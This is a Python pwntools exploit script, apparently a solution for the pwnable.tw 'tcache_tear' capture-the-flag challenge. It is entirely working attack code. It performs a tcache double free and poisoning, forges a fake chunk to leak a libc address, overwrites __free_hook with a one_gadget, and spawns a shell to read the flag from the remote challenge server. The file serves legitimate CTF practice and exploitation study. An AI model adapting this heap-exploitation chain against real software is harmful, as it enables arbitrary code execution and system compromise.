from pwn import *
import sys

env={'LD_PRELOAD': '/home/mylinh/Documents/pwnable.tw/tcache_tear/libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so'}

if len(sys.argv) < 2:
	r = process(['./tcache_tear', 'abc'],env=env)
	# raw_input('debug')
else:
	host, port = 'chall.pwnable.tw', 10207
	r = remote(host, port)

def alloc(size, data):
	r.sendlineafter('Your choice :', '1')
	r.sendlineafter('Size:', str(size))
	r.sendafter('Data:', data)

def free():
	r.sendlineafter('Your choice :', '2')

def info():
	r.sendlineafter('Your choice :', '3')

r.sendafter('Name:', p64(0) + p64(0x91))

alloc(0x5, 'a')
free() #1
free() #2
alloc(0x5, p64(0x602088))
alloc(0x5, 'b')

payload = p64(0x602070) + p64(0)*13 + p64(0x21) + p64(0)*3 + p64(0x21)
alloc(0x5, payload)


alloc(0x88, 'a')
free() #3
free() #4
alloc(0x88, p64(0x602088))
alloc(0x88, 'b')

payload = p64(0x602070) + p64(0)*13 + p64(0x21) 
alloc(0x88, payload)
free() #5

info()
r.recvuntil("Name :")
r.recv(16)
libc_base = u64(r.recv(8)) - 0x3ebca0
log.info("libc_base = %#x" %libc_base)
one_gadget = libc_base + 0x4f322
free_hook_add = libc_base + 0x3ed8e8


alloc(0x20, 'a')
free() #6
free() #7
alloc(0x20, p64(free_hook_add))
alloc(0x20, 'b')


payload = p64(one_gadget)
alloc(0x20, payload)
alloc(0x30, "/bin/sh\x00")
free()
r.sendline('cat home/tcache_tear/flag')

r.interactive()
r.close()

# FLAG